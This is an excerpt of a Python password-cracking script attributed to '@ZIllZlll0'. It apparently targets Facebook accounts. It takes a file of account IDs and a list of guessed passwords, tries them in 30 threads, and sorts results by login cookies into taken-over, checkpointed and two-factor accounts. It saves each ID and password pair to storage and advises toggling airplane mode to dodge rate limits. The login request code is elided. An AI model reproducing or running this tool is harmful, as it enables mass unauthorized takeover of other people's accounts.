...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; @ZIllZlll0 \x07')
...
'''
'''
'\033[1;31m'×××\033[1;97m×××××××××××××××××××××××××××××××××××××××××\033[1;32m×××
'\033[1;31m'[\033[1;97m+\033[1;32m]\033[91m Owner   :            @ZIllZlll0
'\033[2;34m'[\033[1;97m+\033[1;32m]\033[92m TELE    :           https://t.me/nonnnf
'\033[2;34m'[\033[1;97m+\033[1;32m] \033[93mGithub  :            NALUTY01
'\033[2;36m'[\033[1;97m+\033[1;32m]\033[96m Version :            2.0
'\033[2;36m'[\033[1;97m+\033[1;32m]\033[95m TYP     :            FREE\033[1;32m
×××\033[1;97m×××××××××××××××××××××××××××××××××××××××××\033[1;32m×××\033[1;37m"""



def linex():
    print(f'{GREEN}×××{WHITE}×××××××××××××××××××××××××××××××××××××××××{GREEN}×××{WHITE}')
...
def main():
    ...
    print(logo)
    print(f'{GREEN}[{WHITE}1{GREEN}]{WHITE} FILE CRACK')
    print(f'{GREEN}[{WHITE}2{GREEN}]{WHITE} REMOVE NEW IDS')
    print(f'{GREEN}[{WHITE}3{GREEN}]{WHITE} UNBLUCK IP {RED}[SOON]{WHITE}')
    print(f'{GREEN}[{WHITE}4{GREEN}]{WHITE} TELE {GREEN}[JOIN]{WHITE}')
 
    
    print('')
    HAMII = input(f'{WHITE} {GREEN}[{WHITE}+{GREEN}]{WHITE} COHSE : ')
    if HAMII in ["1","01"]: 
        file_crack()
    elif HAMII in ["2","02"]:
        REMOVENIDS()
    elif HAMII in ["4","00"]:
        os.system("xdg-open https://t.me/nonnnf")
    elif HAMII in ["0","00"]:
...
def file_crack():
    ...
    os.system('clear')
    print(logo)
    print(f'{GREEN}[{WHITE}1{GREEN}]{WHITE} METHOD{GREEN} [MIX] ')
    print(f'{GREEN}[{WHITE}2{GREEN}]{WHITE} METHOD{GREEN} [NEW] ')
    print("")
    opt_method = input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} CHOSE METHOD : ')
    os.system('clear')
    print(logo) 
    file = input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} PUT FILE NAME :{GREEN} ')
    try:
    ...
    try:
        clear()
        print(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} LIMIT OF PASS {GREEN}[{WHITE}15{GREEN}/{WHITE}20{GREEN}]{WHITE}\n')
        print("")
        ps_limit = int(input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} LIMIT PASS : '))
    except:
        ps_limit =1
    print(' ')
    os.system('clear')
    ...
    for i in range(ps_limit):
        plist.append(input(f'{GREEN}[{WHITE}+{GREEN}]{WHITE} PASSWORD  {i+1}: '))
    with ThreadPool(max_workers=30) as crack_submit:
        os.system('clear')
        print(logo)
        total_ids = str(len(fo))
      #  print(f"{GREEN} [{WHITE}DATE{GREEN}]{WHITE}           :{GREEN}", current_date_time)
        print(f'{GREEN} [{WHITE}TOTAL IDS{GREEN}] {WHITE}     :{GREEN} '+total_ids)
        print(f' {GREEN}[{WHITE}LIMIT OF PASS{GREEN}]{WHITE}  :{GREEN}',ps_limit)
        print(f' {GREEN}[{WHITE}SELECT METHOD{GREEN}]{WHITE}  :{GREEN}','M',opt_method)
        print(f"\r{GREEN} [{WHITE}ON{GREEN}/{WHITE}OFF{GREEN}]{WHITE}AIREPLANE EVERY {GREEN}2{WHITE}MIN")
        linex()
        for user in fo:
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/@ZIllZlll0-IDS_OK.txt\n[•] CP IDS SAVE : /sdcard/@ZIllZlll0-IDS_CP.txt')
    input('[•] PRESS ENTER TO BACK MENU   ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    rcol =['\033[1;32m','\033[1;31m']
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}{GREEN}[{WHITE}MOAD{GREEN}]{WHITE}%s[%s] {GREEN}[{WHITE}OK:%s CP:%s 2F:%s{GREEN}]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\033[1;32m[@ZIllZlll0-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/@ZIllZlll0_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    print('\r\033[1;35m[@ZIllZlll0-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/@ZIllZlll0-DS_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[@ZIllZlll0-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/@ZIllZlll0_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                print('\r\033[1;32m[@ZIllZlll0-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/@ZIllZlll0.txt_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    ...
                    print('\r\033[1;35m[@ZIllZlll0-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/@ZIllZlll0_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
         
                    print('\r\033[1;31m[@ZIllZlll0-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/@ZIllZlll0_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def REMOVENIDS():
    os.system('clear')
    print(logo)
    print("\33[1;36mTHIS TOOL FORE REMVOE NEW IDS 10009,6155")
    print("\33[1;35mBY : @ZIllZlll0 ")
    ...
    # حذف ايديات الجديده
    filtered_lines = [line for line in lines if not line.startswith(('10009', '6155'))]
